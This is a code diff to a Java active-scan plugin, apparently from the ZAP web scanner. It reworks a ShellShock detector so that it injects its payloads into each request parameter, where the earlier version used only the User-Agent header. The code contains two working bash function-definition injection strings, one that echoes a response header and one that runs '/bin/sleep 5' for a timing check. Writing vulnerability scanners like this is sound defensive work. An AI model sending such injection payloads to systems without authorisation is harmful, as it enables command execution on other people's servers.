@@ -21,7 +21,7 @@ import java.util.Vector;
 
 import org.apache.log4j.Logger;
 import org.parosproxy.paros.Constant;
-import org.parosproxy.paros.core.scanner.AbstractAppPlugin;
+import org.parosproxy.paros.core.scanner.AbstractAppParamPlugin;
 import org.parosproxy.paros.core.scanner.Alert;
 import org.parosproxy.paros.core.scanner.Category;
 import org.parosproxy.paros.core.scanner.Plugin;
@@ -34,13 +34,17 @@ import org.parosproxy.paros.network.HttpMessage;
 * @author psiinon
 *
 */
-public class ShellShockScanner extends AbstractAppPlugin {
+public class ShellShockScanner extends AbstractAppParamPlugin {
 
 	/**
 	 * the logger object
 	 */
 	private static final Logger log = Logger.getLogger(ShellShockScanner.class);
-
+	
+	private final String attackHeader = "X-Powered-By";		
+	
+	// Use a standard HTTP response header, to make sure the header is not dropped by load balancers, proxies, etc
+	private final String evidence = "ShellShock-Vulnerable";
 
 	/**
 	 * returns the plugin id
@@ -87,20 +91,17 @@ public class ShellShockScanner extends AbstractAppPlugin {
 	public void init() {		
 	}
 
-
-	@Override
-	public void scan() {		
+	@Override	
+	public void scan(HttpMessage origMsg, String paramName, String paramValue) {
 		try {
 			// First try a simple reflected attack
-			// Use a standard HTTP response header, to make sure the header is not dropped by load balancers, proxies, etc
-			String attackHeader = "X-Powered-By";		
-			String evidence = "ShellShock-Vulnerable";
-			
+			// With CGI, the evidence will come out in the header
 			HttpMessage msg1 = getNewMsg();
 			String attack = "() { :;}; echo '"+attackHeader+": " + evidence + "'";
 			
-			msg1.getRequestHeader().setHeader(HttpHeader.USER_AGENT, attack);
+			setParameter (msg1, paramName, attack);
 			sendAndReceive(msg1, false); //do not follow redirects
+			
 			
 			Vector<String> ssHeaders = msg1.getResponseHeader().getHeaders(attackHeader);
 			if (ssHeaders != null && ssHeaders.size() > 0) {
@@ -111,7 +112,7 @@ public class ShellShockScanner extends AbstractAppPlugin {
 								this.getName(),
 								this.getDescription(), 
 								null, // originalMessage.getRequestHeader().getURI().getURI(),
-								HttpHeader.USER_AGENT, // parameter being attacked
+								paramName, // parameter being attacked
 								attack,
 								Constant.messages.getString("ascanalpha.shellshock.extrainfo"),
 								this.getSolution(),
@@ -124,10 +125,12 @@ public class ShellShockScanner extends AbstractAppPlugin {
 			}
 			
 			// Then a timing attack
+			// With PHP, the evidence will come out in the body (this will be caught by the timing based attack)
 			boolean vulnerable = false;
 			HttpMessage msg2 = getNewMsg();
 			attack = "() { :;}; /bin/sleep 5";
-			msg2.getRequestHeader().setHeader(HttpHeader.USER_AGENT, attack);
+			
+			setParameter(msg2, paramName, attack);
 			sendAndReceive(msg2, false); //do not follow redirects
 			long attackElapsedTime = msg2.getTimeElapsedMillis();
 			
@@ -150,7 +153,7 @@ public class ShellShockScanner extends AbstractAppPlugin {
 						this.getName(),
 						this.getDescription(), 
 						null, // originalMessage.getRequestHeader().getURI().getURI(),
-						HttpHeader.USER_AGENT, // parameter being attacked
+						paramName, // parameter being attacked
 						attack,
 						Constant.messages.getString("ascanalpha.shellshock.extrainfo"),
 						this.getSolution(),
